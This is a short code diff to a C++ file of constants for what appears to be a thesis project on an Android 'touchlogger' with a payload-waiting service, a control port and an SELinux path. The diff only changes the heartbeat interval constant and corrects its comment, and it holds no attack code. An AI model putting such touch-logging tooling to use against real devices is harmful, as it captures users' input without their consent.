@@ -27,7 +27,7 @@ constexpr auto SERVICE_PROCESS_NAME = "touchlogger.here";
 constexpr auto SERVICE = ".service.PayloadWaitingService";
 constexpr auto ACTION = "org.leyfer.thesis.touchlogger_dirty.service.action.WAIT_FOR_PAYLOAD";
 constexpr auto CONTROL_PORT = 1050;
-constexpr auto HEARTBEAT_INTERVAL_US = (1000 * 1000);  // 1000 secs
+constexpr auto HEARTBEAT_INTERVAL_US = (1000U * 1000U);  // 1 sec
 
 constexpr auto SELINUX_PATH = "/sys/fs/selinux/";
 const std::string heartbeatCommand = "heartbeat\n";
